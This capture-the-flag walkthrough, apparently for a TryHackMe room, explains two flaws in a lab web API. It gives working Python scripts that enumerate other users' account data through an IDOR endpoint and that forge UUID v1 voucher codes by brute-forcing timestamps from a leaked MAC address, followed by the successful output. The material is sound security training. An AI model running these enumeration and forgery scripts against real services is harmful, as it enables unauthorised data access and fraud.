---
tags:
  - thm
  - easy
  - idor
  - python
  - uuid
  - cryptography
  - broken-access-control
Scenario: Enumerating users via IDOR API endpoints; Forging authentication tokens by exploiting UUID v1 predictability.
Link: https://tryhackme.com/room/idor-aoc2025-zl6MywQid9
---
## ⚡ Quick Reference (TL;DR)

### 🧠 Key Concepts & Pro Tips
1.  **IDOR (Insecure Direct Object Reference):** 
    * **The Flaw:** Changing `user_id=1` to `user_id=2` reveals other users' data.
    * **Pro Tip (Frontend != API):** The URL in the browser address bar (e.g., `/customers/view`) is often just a frontend route. The *real* vulnerability is usually in the hidden API calls (e.g., `/api/v1/user/1`). **Always check the Network tab.**

2.  **UUID v1 Predictability:** 
    * **The Flaw:** UUID v1 is generated using **Timestamp + MAC Address**. It is deterministic.
    * **The Attack:** Steal the server's MAC from *any* valid UUID -> Brute-force the timestamp -> Forge admin tokens.
    * **Security Lesson:** UUID v1 leaks infrastructure data. Always use **UUID v4** (random) for security tokens.

3.  **Authentication Headers:**
    * **Pitfall:** Modern APIs often use `Authorization: Bearer <token>` instead of cookies. If your Python script gets `401/403` errors, check that you aren't sending cookies when the server expects a Bearer header.

### 🛠️ Key Python Snippets
**UUID v1 Structure (Forging logic):**
```python
import uuid
# UUID v1 = TimeLow - TimeMid - TimeHigh - ClockSeq - Node(MAC)
# If you have the MAC (node) and guess the time, you can forge it:
spoofed_uuid = uuid.uuid1(node=0x001122334455, clock_seq=0x1234)
```

---

## 🕵️‍♀️ Detailed Walkthrough

### 🛠️ Environment Setup

Since we are using Python to automate requests, always use a virtual environment to manage dependencies.

```bash
# 1. Create & Activate
python3 -m venv .venv
source .venv/bin/activate

# 2. Install Requests
pip install requests

# 3. Run Scripts
python solver.py
```

### 🎯 Task 1: Finding the Parent (IDOR)

**Vulnerability:** Insecure Direct Object Reference (IDOR).

The application allows us to request details for any user by simply changing the `user_id` parameter in the API call, without verifying if we are authorized to view that data.

**The Strategy:**

1.  Identify the API endpoint: `http://[IP]/api/parents/view_accountinfo`.
2.  Capture a valid JWT `Authorization` token from the browser (F12 > Network).
3.  Write a script to iterate `user_id` from 1 to 100.
4.  Parse the returned JSON to count the `children` array.

#### 🐍 Solution Script (`idor_solver.py`)

```python
import requests

# CONFIG
url = "http://[IP]/api/parents/view_accountinfo"
headers = {
    # Replace with your fresh token from Browser DevTools
    "Authorization": "Bearer YOUR_TOKEN_HERE",
    "Content-Type": "application/json"
}

print(f"[-] Scanning {url}...")

for user_id in range(1, 101):
    try:
        r = requests.get(url, params={'user_id': user_id}, headers=headers, timeout=3)
        
        if r.status_code == 200:
            data = r.json()
            children = data.get('children', [])
            count = len(children)
            
            # Logic: We need the parent with exactly 10 children
            if count == 10:
                print(f"\n TARGET FOUND")
                print(f"User ID: {user_id}")
                print(f"Child Count: {count}")
                break
                
    except Exception as e:
        pass
```

### 🔮 Task 2: Forging the Voucher (UUID v1 Prediction)

**Vulnerability:** Weak Randomness (Predictable UUIDs).
The vouchers use UUID Version 1.

-   **Structure:** `Time-Low` - `Time-Mid` - `Time-High` - `Clock-Seq` - `Node (MAC Address)`
-   **Flaw:** If you know the **Server's MAC Address** (Node) and the **Time** the UUID was generated, you can recreate the UUID exactly.

**The Strategy:**
1.  **Get the MAC:** Use the IDOR from Task 1 to inspect other users (e.g., User ID 1) and find *any* existing voucher code. The last 12 characters of *any* valid UUID on this system reveal the server's MAC address.
2.  **Define the Time:** The prompt states the target voucher was generated on **20 Nov 2025, 20:00–24:00 UTC**.
3.  **Brute Force:** Generate a valid UUID v1 for every minute in that 4-hour window using the stolen MAC address, and submit it to the API.

#### 🐍 Solution Script (`voucher_forger.py`)

```python
import requests
import datetime
import uuid

# --- CONFIG ---
url = "http://[IP]/api/parents/vouchers/claim"
token = "YOUR_TOKEN_HERE"

# The "Template" UUID found from another user (User 1, etc.)
# We strip the MAC address (last part) from this to sign our forged tickets.
template_uuid = "37f0010f-a489-11f0-ac99-026ccdf7d769" 

headers = {
    "Authorization": f"Bearer {token}",
    "Content-Type": "application/json"
}

def forge_uuid(dt, template_str):
    # 1. Calculate 100-nanosecond intervals since UUID epoch (1582-10-15)
    uuid_epoch_offset = 12219292800
    unix_time = dt.replace(tzinfo=datetime.timezone.utc).timestamp()
    intervals = int((unix_time + uuid_epoch_offset) * 10000000)
    
    # 2. Construct Time Segments
    time_low = intervals & 0xFFFFFFFF
    time_mid = (intervals >> 32) & 0xFFFF
    time_hi = ((intervals >> 48) & 0x0FFF) | 0x1000 # Set version to 1
    
    # 3. Steal Clock Sequence & Node (MAC) from the template
    parts = template_str.split('-')
    clock_seq = parts[3]
    node = parts[4] # The secret sauce
    
    return f"{time_low:08x}-{time_mid:04x}-{time_hi:04x}-{clock_seq}-{node}"

print("[-] Starting Brute Force (20:00 - 24:00 UTC)...")

# Loop through 4 hours (240 minutes)
start_dt = datetime.datetime(2025, 11, 20, 20, 0, 0, tzinfo=datetime.timezone.utc)

for i in range(241):
    current_dt = start_dt + datetime.timedelta(minutes=i)
    fake_code = forge_uuid(current_dt, template_uuid)
    
    try:
        r = requests.post(url, json={"code": fake_code}, headers=headers, timeout=2)
        
        # 404 = Invalid Code. Any other status is likely a hit.
        if r.status_code != 404:
            print(f"\n[!!!] JACKPOT [!!!]")
            print(f"Time: {current_dt.strftime('%H:%M')} UTC")
            print(f"Voucher: {fake_code}")
            print(f"Response: {r.text}")
            break
            
    except Exception as e:
        print(f"Error: {e}")
```

### Execution & Flag 

Running the `voucher_forger.py` script successfully guessed the correct timestamp. The API accepted the forged UUID and returned the flag in the JSON response.

```bash
[-] Starting Brute Force (20:00 - 24:00 UTC)...

[!!!] JACKPOT [!!!]
Time: 21:09 UTC
Voucher: 22643e00-c655-11f0-ac99-026ccdf7d769
Response: {"voucher_id":22,"code":"22643e00-c655-11f0-ac99-026ccdf7d769","extra_count":1,"created_at":"2025-10-10T10:24:14+00:00"}
```